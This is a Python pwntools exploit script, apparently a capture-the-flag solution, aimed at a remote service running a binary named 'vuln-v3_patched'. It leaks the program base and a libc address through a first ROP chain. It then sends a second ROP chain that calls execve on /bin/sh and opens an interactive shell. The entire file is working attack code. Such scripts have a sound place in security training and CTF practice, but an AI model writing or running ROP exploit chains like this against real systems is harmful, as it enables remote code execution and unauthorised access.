from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("./vuln-v3_patched")
libc = ELF(
    "./libc-2.33-5-x86_64.so"
)  # build id: 4b406737057708c0e4c642345a703c47a61c73dc

# io = process("./vuln-v3_patched")
# io = remote("spclr.ch", 1260)
io = remote("spclr.ch", 1260)
io.recvuntil(b"am: ")
main = int(io.recvlineS(), 16)

elf.address = main - elf.sym["main"]
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address
chain1 = [
    pop_rdi,
    elf.got["puts"],
    elf.sym["puts"],
    elf.sym["main"],
]


def send_chain(chain):
    io.sendlineafter(b"submit?", b"-1")
    io.sendlineafter(b"number:", str(5 + len(chain)).encode())
    for x in reversed(chain):
        io.sendlineafter(b"number:", str(x).encode())
    io.sendlineafter(b"number:", b"a")  # prevent overwriting got


send_chain(chain1)

d = io.recvuntil(b"Welcome")
puts = int.from_bytes(d[-14:-8], "little")
print(f"{puts = :#x}")
libc_base = puts - libc.sym["puts"]
print(f"{libc_base = :#x}")
libc.address = libc_base
rop = ROP(libc)

syscall = rop.find_gadget(["syscall"]).address
pop_rax_rdx_rbx = rop.find_gadget(["pop rax", "pop rdx", "pop rbx", "ret"]).address
binsh = next(libc.search(b"/bin/sh\0"))
chain2 = [pop_rax_rdx_rbx, 59, 0, 0, pop_rdi, binsh, pop_rsi_r15, 0, 0, syscall]

send_chain(chain2)

io.interactive()
